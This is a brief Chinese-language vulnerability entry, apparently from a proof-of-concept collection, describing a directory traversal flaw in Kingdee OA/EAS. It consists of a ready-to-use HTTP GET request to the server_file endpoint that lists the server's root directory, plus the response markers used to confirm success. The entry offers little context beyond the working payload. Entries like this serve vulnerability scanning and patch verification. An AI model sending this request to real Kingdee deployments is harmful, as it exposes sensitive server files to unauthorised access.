﻿# 金蝶OA server_file 目录遍历漏洞 测二

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：金蝶EAS存在目录遍历漏洞，攻击者可利用该漏洞获取服务器敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /appmonitor/protected/selector/server_file/files?folder=/&suffix= HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：total

> 上传文件定位：

> 验证文件来源：金蝶 OA server_file 目录遍历漏洞 测二.poc
